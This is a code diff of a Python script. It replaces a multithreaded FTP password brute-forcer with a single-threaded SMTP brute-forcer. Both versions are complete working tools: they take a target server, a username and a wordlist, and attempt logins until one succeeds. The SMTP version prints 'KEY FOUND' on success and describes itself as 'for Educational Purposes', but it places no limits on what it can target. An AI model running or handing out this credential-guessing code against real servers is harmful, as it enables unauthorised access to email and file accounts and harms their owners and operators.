@@ -1,93 +1,53 @@
-import ftplib
-from threading import Thread
-import queue
+import smtplib
 import argparse
-from urllib.parse import urlparse
-from colorama import Fore, init
 
-# Initialize the console for colors (for Windows)
-init()
-
-# Initialize the queue
-q = queue.Queue()
-
-# Number of threads to spawn
-n_threads = 30
-
-def connect_ftp(host, user):
-    global q
-    while True:
-        # Get the password from the queue
-        password = q.get()
-        # Initialize the FTP server object
-        server = ftplib.FTP()
-        print("[!] Trying", password)
+def smtp_bruteforce(target, port, username, password_list):
+    for password in password_list:
         try:
-            # Try to connect to FTP server with a timeout of 5 seconds
-            server.connect(host, 21, timeout=5)
-            # Login using the credentials (user & password)
-            server.login(user, password)
-        except ftplib.error_perm:
-            # Login failed, wrong credentials
-            pass
+            # Attempt to connect to the SMTP server
+            server = smtplib.SMTP(target, port)
+            server.set_debuglevel(0)
+            server.ehlo()  # Start the connection
+            server.login(username, password)  # Try logging in
+
+            print(f"KEY FOUND [{password}]")
+            server.quit()
+            break
+
+        except smtplib.SMTPAuthenticationError:
+            # Incorrect password, move to next in the list
+            print(f"Trying password: {password} - Failed")
+            continue
         except Exception as e:
-            # Handle other FTP exceptions
-            print(f"[!] Error: {e}")
-        else:
-            # Correct credentials found
-            print(f"{Fore.GREEN}[+] Found credentials: ")
-            print(f"\tHost: {host}")
-            print(f"\tUser: {user}")
-            print(f"\tPassword: {password}{Fore.RESET}")
-            # We found the password, let's clear the queue
-            with q.mutex:
-                q.queue.clear()
-                q.all_tasks_done.notify_all()
-                q.unfinished_tasks = 0
-        finally:
-            # Notify the queue that the task is completed for this password
-            q.task_done()
+            print(f"An error occurred: {e}")
+            break
+
+    else:
+        print("KEY NOT FOUND")
 
 def main():
-    # Set up argparse to handle command-line arguments
-    parser = argparse.ArgumentParser(description="FTP Brute Forcing Script")
-    parser.add_argument("-l", "--username", required=True, help="Username for the FTP server")
-    parser.add_argument("-P", "--password_list", required=True, help="Path to the password list (wordlist.txt)")
-    parser.add_argument("target", help="Target FTP server URL (ftp://<target_ip>)")
+    # Set up argument parsing using argparse
+    parser = argparse.ArgumentParser(description="SMTP Brute Force for Educational Purposes")
+    
+    # Define command-line arguments
+    parser.add_argument('-l', '--username', type=str, required=True, help='Username (email address) for SMTP login')
+    parser.add_argument('-P', '--passwordlist', type=str, required=True, help='Path to the password list file')
+    parser.add_argument('smtp_server', type=str, help='Target SMTP server (e.g., smtp.example.com)')
+    parser.add_argument('port', type=int, help='SMTP server port (e.g., 587)')
 
+    # Parse the command-line arguments
     args = parser.parse_args()
 
-    # Parse the host from the URL (e.g., ftp://192.168.1.113)
-    parsed_url = urlparse(args.target)
-    if parsed_url.scheme != "ftp":
-        print("[-] Invalid URL scheme. Use 'ftp://<target_ip>'")
-        return
-    host = parsed_url.hostname
-    user = args.username
-
-    # Read the wordlist of passwords
+    # Read the password list from the file
     try:
-        with open(args.password_list, "r") as file:
-            passwords = file.read().splitlines()
+        with open(args.passwordlist, 'r') as f:
+            password_list = [line.strip() for line in f]
     except FileNotFoundError:
-        print(f"[-] Password list file '{args.password_list}' not found.")
+        print(f"Error: The file {args.passwordlist} does not exist.")
         return
 
-    print(f"[+] Passwords to try: {len(passwords)}")
-
-    # Put all passwords into the queue
-    for password in passwords:
-        q.put(password)
-
-    # Create `n_threads` that run the connect_ftp function
-    for t in range(n_threads):
-        thread = Thread(target=connect_ftp, args=(host, user))
-        # Will end when the main thread ends
-        thread.daemon = True
-        thread.start()
-
-    # Wait for the queue to be empty
-    q.join()
+    # Run the brute force attack
+    smtp_bruteforce(args.smtp_server, args.port, args.username, password_list)
 
 if __name__ == "__main__":
     main()
